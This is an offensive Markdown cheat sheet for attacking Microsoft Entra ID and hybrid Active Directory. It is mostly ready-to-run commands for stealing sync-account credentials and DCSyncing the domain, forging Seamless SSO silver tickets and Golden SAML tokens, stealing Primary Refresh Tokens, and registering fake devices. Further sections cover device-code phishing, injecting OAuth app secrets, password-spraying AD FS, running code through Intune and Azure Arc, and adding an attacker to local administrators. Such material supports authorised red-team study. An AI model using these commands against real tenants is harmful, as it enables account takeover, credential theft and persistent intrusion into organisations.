# AD - Entra ID & Hybrid Identity

## Table of Contents
- [Attack Surface Overview](#attack-surface-overview)
- [Entra Connect / Cloud Sync](#entra-connect--cloud-sync)
- [PHS / PTA / Federation Compared](#phs--pta--federation-compared)
- [Attacking the Sync Account (DCSync via AAD_)](#attacking-the-sync-account-dcsync-via-aad_)
- [Seamless SSO: AZUREADSSOACC Silver Ticket](#seamless-sso-azureadssoacc-silver-ticket)
- [On-Prem -> Cloud Pivots](#on-prem---cloud-pivots)
- [Cloud -> On-Prem Pivots](#cloud---on-prem-pivots)
- [Primary Refresh Token (PRT) Theft & Abuse](#primary-refresh-token-prt-theft--abuse)
- [Device Registration / Join Abuse](#device-registration--join-abuse)
- [Conditional Access Considerations](#conditional-access-considerations)
- [Enumerating Entra](#enumerating-entra)
- [Consent / OAuth App Abuse](#consent--oauth-app-abuse)
- [Golden SAML (Federation Forging)](#golden-saml-federation-forging)
- [Intune as a Lateral Path](#intune-as-a-lateral-path)
- [Azure Arc](#azure-arc)
- [Role / Privilege Requirements Summary](#role--privilege-requirements-summary)

For on-prem DCSync used to reach the sync account see [acl-abuse.md](acl-abuse.md). For ADCS/PKINIT cert abuse that feeds cloud auth see [adcs.md](adcs.md). For detection of these techniques see [opsec-and-detection.md](opsec-and-detection.md).

---

## Attack Surface Overview
Hybrid identity bridges on-prem AD and Entra ID (Azure AD). The bridge components are the crown jewels: **Entra Connect** (Sync), the **sync service account**, the **Seamless SSO computer object (AZUREADSSOACC$)**, **federation trust (AD FS / token-signing cert)**, and **PRTs** issued to joined/registered devices. Compromise of any one usually pivots the whole tenant or the whole forest.

Golden rules:
- Global Admin (cloud) does NOT automatically equal Domain Admin (on-prem) — but Entra Connect misconfig and hybrid identities frequently make each reachable from the other.
- Entra roles matter (Global Admin, Privileged Role Admin, Application Admin, Cloud Device Admin, Intune Admin) — note which technique needs which.

## Entra Connect / Cloud Sync
Entra Connect (legacy "AAD Connect", server-based) or Cloud Sync (lightweight agent) replicates on-prem identities to the cloud in one of three auth models. The sync server holds highly privileged credentials and is a Tier-0 asset.

Identify the model / server:
```powershell
# On a domain-joined host (recon):
Get-ADUser -Filter "samaccountname -like 'MSOL_*'" -Properties Description   # AAD_/MSOL_ sync acct
Get-ADUser -Filter "samaccountname -eq 'AZUREADSSOACC'"                       # Seamless SSO enabled?
nltest /dsgetdc:domain.local
# Cloud-side:
Get-MgOrganization | Select-Object OnPremisesSyncEnabled
AADInternals> Get-AADIntCompanyInformation                                   # DirSyncEnabled, PHS, etc.
```

## PHS / PTA / Federation Compared
| Model | How auth works | Prime attack |
|---|---|---|
| **PHS** (Password Hash Sync) | NT hash-of-hash synced to cloud; cloud validates | Dump synced hashes from Connect DB; DCSync via sync acct; set cloud pw as Hybrid abuse |
| **PTA** (Pass-Through Auth) | Agent on-prem validates each logon against DC | Inject into PTA agent to intercept/validate arbitrary creds (backdoor) |
| **Federation** (AD FS) | On-prem STS issues SAML token cloud trusts | Golden SAML: steal token-signing cert, forge tokens for any user w/ any claims |
| **Seamless SSO** (add-on) | Kerberos to AZUREADSSOACC$ then to cloud | Silver ticket against AZUREADSSOACC$ (its NT hash rarely rotates) |

## Attacking the Sync Account (DCSync via AAD_)
The Entra Connect sync account (`MSOL_<hex>` on-prem service account, and `Sync_<host>_<hex>@tenant` cloud account) has **DCSync rights on the on-prem domain** to read all password hashes for PHS. Compromising the Connect server → extract the sync account creds → DCSync the whole domain, even without Domain Admin.
```powershell
# On the Entra Connect server, recover the stored sync credentials from the ADSync DB (DPAPI-protected)
AADInternals> Get-AADIntSyncCredentials
#   returns the MSOL_ account name + cleartext password (on-prem) and the cloud Sync_ creds

# Use the recovered MSOL_ creds to DCSync (it holds Get-Changes/Get-Changes-All):
# Linux:
secretsdump.py 'domain.local/MSOL_xxxx:<pw>'@<DC> -just-dc
# Windows (mimikatz):
lsadump::dcsync /domain:domain.local /user:krbtgt

# Extract the synced hashes / seed directly from the ADSync database (alt path):
AADInternals> Get-AADIntSyncCredentials
# The cloud Sync_ account can also be abused to set cloud passwords via Set-AADIntUserPassword.
```
Cloud side: the `Sync_*` account holds the **Directory Synchronization Accounts** role, which can reset non-admin cloud passwords and (historically) abuse `Set-AADIntUserPassword` to log in as synced users without their real password.

## Seamless SSO: AZUREADSSOACC Silver Ticket
When Seamless SSO is enabled, a computer object `AZUREADSSOACC$` represents the cloud SSO endpoint. Its Kerberos service is `HTTP/autologon.microsoftazuread-sso.com`. Its password (NT hash) is set at enablement and **often never rotated** — with that hash you forge a silver ticket for any user and get cloud SSO as them.
```powershell
# 1. Get AZUREADSSOACC$ NT hash (DCSync it):
secretsdump.py 'domain.local/DA:pw'@<DC> -just-dc-user 'AZUREADSSOACC$'
# 2. Forge a silver ticket for the target user's on-prem SID (mimikatz):
kerberos::golden /user:victim /sid:<domain-SID> /domain:domain.local \
    /rc4:<AZUREADSSOACC-NThash> /target:aadg.windows.net.nsatc.net \
    /service:HTTP /ptt
# 3. Use the ticket to obtain a cloud access token for the victim.
```

## On-Prem -> Cloud Pivots
- **DCSync a hybrid user's on-prem hash** → if PHS, the cloud accepts the same password → sign in to Entra as that user.
- **Compromise Connect server** → sync account → Golden SAML (if federated) or cloud password resets.
- **AZUREADSSOACC silver ticket** → cloud tokens for arbitrary hybrid users.
- **Reset a hybrid user's on-prem password** (ACL abuse) → propagates to cloud on next sync (PHS).

## Cloud -> On-Prem Pivots
- **Global Admin → Connect server**: GA can often reach the hybrid Connect server / run commands via Intune-managed devices or by resetting the on-prem-writeback path.
- **Intune (Cloud → device)**: push a script/app to Entra-joined or hybrid-joined devices as SYSTEM (see Intune section) → land on domain-joined machines.
- **Cloud Kerberos / password writeback**: if writeback is enabled a cloud pw reset flows back on-prem.
- **Run-command on Azure VMs / Arc-enabled servers** that are also domain-joined.

## Primary Refresh Token (PRT) Theft & Abuse
A PRT is a long-lived token bound to a device that yields access/refresh tokens for cloud apps, and (crucially) satisfies MFA + device-based Conditional Access. Steal it from a compromised Entra-joined/registered host to impersonate the user in the cloud.
```powershell
# Extract PRT + session key on the victim host (requires local admin / SYSTEM + interactive user session):
# ROADtoken / requesttoken via BrowserCore, or mimikatz to pull the PRT cookie material:
mimikatz # privilege::debug
mimikatz # sekurlsa::cloudap                       # dumps PRT, ProofOfPossessionKey (needs DPAPI ctx)
# Derive a PRT-cookie and mint tokens (AADInternals / ROADtools):
AADInternals> $prt = Get-AADIntUserPRTToken       # from the logged-on user context
AADInternals> Get-AADIntAccessTokenForAADGraph -PRTToken $prt
# ROADtools TokenBinding flow:
roadtx prt -u victim@tenant -p pass               # request a fresh PRT with creds
roadtx prtauth -prt <prt> -prtkey <key>           # use PRT to get tokens for a target resource
roadtx browserprtauth                             # open an authenticated browser session
```
PRT abuse bypasses password + MFA because the token already represents a compliant device authentication. Detection hinges on impossible-travel / device anomalies.

## Device Registration / Join Abuse
Registering an attacker-controlled device into Entra can satisfy device-based Conditional Access and get its own PRT. Requires valid user creds and that device registration isn't restricted.
```powershell
# Join / register a fake device to obtain a device cert + PRT (ROADtools):
roadtx device -a register -u victim@tenant -p pass -n FakeDevice     # register (Entra registered)
roadtx device -a join     -u victim@tenant -p pass -n FakeDevice     # Entra joined
roadtx prt -c FakeDevice.pem -k FakeDevice.key -u victim@tenant -p pass
# AADInternals equivalent:
AADInternals> Join-AADIntDeviceToAzureAD -DeviceName "FakeDevice" -DeviceType "Windows" -OSVersion "10.0"
```
`msDS-DeviceRegistration` quota and CA policies gate this; note the join count limit per user.

## Conditional Access Considerations
CA is the primary cloud guardrail. Practical notes:
- **PRT / device-compliant tokens** satisfy "require compliant/hybrid-joined device" and often MFA — the reason PRT theft is powerful.
- **Legacy auth** (IMAP/POP/SMTP/older EWS) may bypass CA if not blocked — test `roadtx` device-code or ROPC flows against `login.microsoftonline.com`.
- **Device-code phishing** yields tokens without hitting the interactive CA MFA prompt in some configs:
```powershell
roadtx gettokens --device-code -c <client_id> -r https://graph.microsoft.com
GraphRunner> Invoke-DeviceCodePhish
```
- Enumerate CA policies (needs read access) to find gaps: `roadrecon plugin policies` / `Get-MgIdentityConditionalAccessPolicy`.

## Enumerating Entra
```powershell
# AADInternals (PowerShell) - tenant recon, often unauthenticated for basics
Get-AADIntTenantID -Domain target.com
Get-AADIntLoginInformation -Domain target.com          # federation? managed? desktop SSO?
Get-AADIntTenantDomains -Domain target.com

# ROADrecon (Python) - full offline dump of the directory into a local DB + web UI
roadrecon auth -u user@tenant -p pass                  # or --device-code / --prt
roadrecon gather                                        # pull all objects into roadrecon.db
roadrecon gui                                           # browse; roadrecon plugin <name> for extras

# GraphRunner (PowerShell) - post-auth Graph tradecraft
GraphRunner> Get-GraphTokens                            # device-code auth, stores tokens
GraphRunner> Invoke-GraphRecon                          # tenant/user/role/CA recon
GraphRunner> Invoke-DumpApps                            # app registrations + secrets/permissions
GraphRunner> Get-SecurityGroups / Get-DynamicGroups

# az cli / Microsoft Graph PowerShell
az login ; az ad user list ; az role assignment list --all
Connect-MgGraph -Scopes "Directory.Read.All"
Get-MgUser -All ; Get-MgDirectoryRole ; Get-MgServicePrincipal -All
```

## Consent / OAuth App Abuse
Malicious or over-permissioned OAuth apps grant durable, MFA-surviving access via refresh tokens.
- **Illicit consent grant / phishing**: register an app, send a consent URL; if the user (or admin) consents to Graph scopes (Mail.Read, Files.ReadWrite.All), you hold their data via refresh tokens.
- **Add credentials to an existing service principal** (needs Application Admin / owner of the app) → authenticate as that SP with its app roles:
```powershell
GraphRunner> Invoke-InjectOAuthApp -AppName "Legit App" -ReplyUrl <url>
GraphRunner> Invoke-SecurityGroupCloner                # add self to a group via app perms
# Add a client secret to an app you can edit (persistence / privilege via app roles):
az ad app credential reset --id <appId> --append
Add-MgApplicationPassword -ApplicationId <objId>
```
Application-permission grants of `RoleManagement.ReadWrite.Directory` or `AppRoleAssignment.ReadWrite.All` are effectively Global-Admin-equivalent — hunt for them in `Invoke-DumpApps`.

## Golden SAML (Federation Forging)
If the tenant is federated (AD FS), the AD FS **token-signing certificate** private key lets you forge SAML tokens for *any* user with *any* claims — bypassing password, MFA, and CA, valid until the cert is rotated. Requires access to the AD FS server (or its DKM key in AD) to extract the signing cert.
```powershell
# Extract the AD FS token-signing cert + config (on the AD FS server, or via the DKM master key):
AADInternals> Export-AADIntADFSSigningCertificate -Filename adfs_signing.pfx
# or from a backup / DB with the DKM key from AD:
AADInternals> Get-AADIntADFSConfiguration ; Get-AADIntADFSSigningCertificate

# Forge a token for an arbitrary user and log in to the cloud:
AADInternals> $saml = New-AADIntSAMLToken -ImmutableID <base64immutableId> `
    -PfxFileName adfs_signing.pfx -Issuer "http://adfs.domain.local/adfs/services/trust"
AADInternals> Open-AADIntOffice365Portal -SAMLToken $saml
```
Immutable ID = base64 of the user's on-prem objectGUID (`Get-AADIntImmutableID -ADUser (Get-ADUser victim)`). Mitigation = rotate the token-signing cert **twice**.

## Intune as a Lateral Path
Intune (Endpoint Manager) can run PowerShell scripts and deploy apps as **SYSTEM** on enrolled devices. Intune Administrator (or Global Admin) → push a payload to Entra-joined / hybrid-joined (and thus domain-joined) machines.
```powershell
GraphRunner> Invoke-IntuneCommand -Command "whoami" -DeviceNames "HOST01"   # run on managed devices
# Or via Graph: create a deviceManagementScript / Win32 app and assign to a device group.
Connect-MgGraph -Scopes DeviceManagementConfiguration.ReadWrite.All
# New-MgDeviceManagementDeviceManagementScript ... then assign -> runs as SYSTEM at next sync.
```
This bridges cloud admin → SYSTEM on on-prem-joined endpoints, a common cloud→on-prem pivot.

## Azure Arc
Azure Arc onboards non-Azure (on-prem) servers into Azure management, enabling `RunCommand` / Custom Script Extension as SYSTEM/root — a direct cloud→on-prem code-exec path on Arc-enabled servers. Requires appropriate RBAC (e.g., Contributor / `Microsoft.HybridCompute/machines/runcommands/write`).
```bash
# Run a command on an Arc-connected machine (az CLI):
az connectedmachine run-command create --name r1 --machine-name <ARCHOST> \
    --resource-group <RG> --location <loc> \
    --script "whoami; net localgroup administrators attacker /add"
# Enumerate Arc machines:
az connectedmachine list -o table
```
Also check the local Arc agent identity (`himds`) — its managed identity token is reachable from the host and may hold Azure roles.

## Role / Privilege Requirements Summary
| Technique | Requires |
|---|---|
| DCSync via sync acct | Local admin on Entra Connect server (to read ADSync DB) |
| AZUREADSSOACC silver ticket | DCSync (to get the NT hash) + Seamless SSO enabled |
| Golden SAML | AD FS server access or DKM key (Domain Admin-ish on-prem) |
| PRT theft | Local admin/SYSTEM on an Entra-joined/registered host + user session |
| Device registration | Valid user creds; registration not blocked by policy |
| Consent grant / app cred inject | Application Admin / Cloud App Admin / app owner |
| Intune command exec | Intune Administrator or Global Admin |
| Azure Arc RunCommand | Azure RBAC write on the Arc machine resource |
| Enumerate directory (roadrecon/GraphRunner) | Any authenticated user (member) |

## Unauthenticated AD FS endpoint recon: FederationMetadata.xml and the usernamemixed oracle

**Trigger:** An external-facing host answers on sts.<domain>, adfs.<domain>, or fs.<domain>, or Get-AADIntLoginInformation reports the tenant as Federated — and you have no credentials yet.

An on-prem AD FS farm publishes its federation metadata anonymously, so pull `https://<sts-host>/FederationMetadata/2007-06/FederationMetadata.xml` before anything else. The document hands you the federation service entityID, which is usually the internal AD domain name rather than the public one, the full list of WS-Trust and WS-Federation endpoints the farm exposes, and the public halves of the token-signing and token-encryption certificates. Record the signing certificate thumbprint and notAfter: it tells you which key a Golden SAML forgery would have to match and when the window closes, so a cert about to roll makes the AD FS server a lower-value target. The endpoint list also shows whether `/adfs/services/trust/2005/windowstransport` is published, which is the integrated-Windows-auth endpoint used as an NTLM relay target in `ctf-ad/ntlm-relay.md`. Separately, `/adfs/services/trust/2005/usernamemixed` accepts a WS-Trust SOAP request carrying a username and password and answers with a SOAP fault whose error text distinguishes the failure reasons, which turns it into an unauthenticated username and password oracle reachable from the internet. Treat it as loud: every attempt is a real authentication against the farm and, if AD FS is configured to pass through to AD, it does increment badPwdCount, so pull the lockout threshold first and pace accordingly. `/adfs/ls/idpinitiatedsignon` responding at all is a cheap confirmation the farm is live before you touch either of the above.

```powershell
curl -sk https://sts.target.com/FederationMetadata/2007-06/FederationMetadata.xml | xmllint --format -
# entityID = internal federation service name; X509Certificate blocks = signing/encryption certs
curl -sk https://sts.target.com/FederationMetadata/2007-06/FederationMetadata.xml \
  | grep -oP '(?<=<X509Certificate>)[^<]+' | head -1 | base64 -d \
  | openssl x509 -inform der -noout -subject -dates -fingerprint

# is the farm alive / which endpoints are published
curl -sk -o /dev/null -w '%{http_code}\n' https://sts.target.com/adfs/ls/idpinitiatedsignon

# WS-Trust usernamemixed oracle (AADInternals wraps the SOAP envelope)
Invoke-AADIntADFSPasswordSpray -Domain target.com -Users users.txt -Password 'Winter2025!'
```

Source: https://offsecexams.com/cheatsheets/zero-credential-domain-mapping

## Dynamic group membership abuse for Entra privilege escalation

**Trigger:** Entra enumeration shows a dynamic security/M365 group whose membership rule keys off a user attribute you can set (e.g. userType, mail, department, otherMails), and that group carries a role or resource access you want.

Dynamic groups auto-assign membership from an attribute rule, so if you can write the attribute the rule matches — on your own account or on a guest you invite — the directory adds you to the group automatically and you inherit whatever role/app/CA-exemption it grants. Read the membershipRule to learn the predicate (commonly `user.otherMails -contains`, `user.department -eq`, or `user.userType -eq "Guest"`), then set that attribute on a principal you control; guest self-invite plus editable secondary email is the classic path when you cannot edit an existing member. Membership recomputes within minutes. This is a stealthy Entra privesc that needs no role assignment of your own — only attribute write on a qualifying object.

```powershell
# Enumerate dynamic groups and their rules:
Get-MgGroup -Filter "groupTypes/any(c:c eq 'DynamicMembership')" -All | select DisplayName,MembershipRule
# Set the matching attribute to trigger auto-join (example: secondary email predicate):
Update-MgUser -UserId <me> -OtherMails @('trigger@matched.domain')
az ad user update --id <me> --department <valueThatMatchesRule>
```

Source: https://offsecexams.com/cheatsheets/cartp-exam---guided-by-redblock

